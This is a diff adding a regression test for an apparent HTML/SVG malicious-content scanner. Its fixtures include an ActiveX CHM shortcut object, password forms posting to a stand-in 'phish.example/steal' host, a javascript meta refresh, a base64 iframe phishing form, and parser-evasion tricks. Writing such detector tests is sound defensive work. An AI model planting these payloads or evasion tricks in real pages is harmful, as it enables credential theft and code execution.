@@ -511,3 +511,51 @@ def test_review_r3_regressions_bogus_comments_slash_endtags_and_quoted_event_att
     res_ev = _scan(tmp_path, "oversized_nospace_ev.svg", no_space_ev)
     assert "WEB_PARSE_LIMIT" in _rule_ids(res_ev)
     assert res_ev.is_incomplete
+
+
+def test_review_r4_regressions_rcdata_rawtext_and_linear_comments_pis(
+    tmp_path: Path,
+) -> None:
+    # Blocker 1: HTML5 RCDATA/RAWTEXT elements with unclosed quote must NOT swallow later tags
+    for tag in ("title", "textarea", "xmp", "iframe", "noembed", "noframes"):
+        doc_chm = (
+            f'<!DOCTYPE html><html><head><{tag}><x a="</{tag}></head><body>'
+            f'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            f'<param name="Command" value="ShortCut"></object></body></html>'
+        ).encode()
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"rcdata_{tag}_chm.html", doc_chm))
+
+        doc_cred = (
+            f'<!DOCTYPE html><html><body><{tag}><x a="</{tag}>'
+            f'<form action="https://phish.example/steal"><input type="password"></form>'
+            f"</body></html>"
+        ).encode()
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(
+            _scan(tmp_path, f"rcdata_{tag}_cred.html", doc_cred)
+        )
+
+        doc_meta = (
+            f'<!DOCTYPE html><html><head><{tag}><x a="</{tag}>'
+            f'<meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head></html>'
+        ).encode()
+        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
+            _scan(tmp_path, f"rcdata_{tag}_meta.html", doc_meta)
+        )
+
+    # Ensure <iframe src="data:text/html;base64,..."> still fires HTML_CREDENTIAL_FORM
+    form_b64 = base64.b64encode(
+        b'<form action="https://phish.example"><input type="password"></form>'
+    ).decode("ascii")
+    iframe_doc = (
+        f'<!DOCTYPE html><html><body><iframe src="data:text/html;base64,{form_b64}">'
+        f"fallback</iframe></body></html>"
+    ).encode()
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "iframe_attr.html", iframe_doc))
+
+    # Major 2: O(N) runtime on 50,000 comments without '--!>' and 50,000 SVG PIs without '?>'
+    many_comments = b"<!DOCTYPE html><html><body>" + b"<!--a-->" * 50_000 + b"</body></html>"
+    many_pis = b"<svg xmlns='http://www.w3.org/2000/svg'>" + b"<?a>" * 50_000 + b"</svg>"
+    t0 = time.perf_counter()
+    _scan(tmp_path, "many_comments.html", many_comments)
+    _scan(tmp_path, "many_pis.svg", many_pis)
+    assert time.perf_counter() - t0 < 2.0
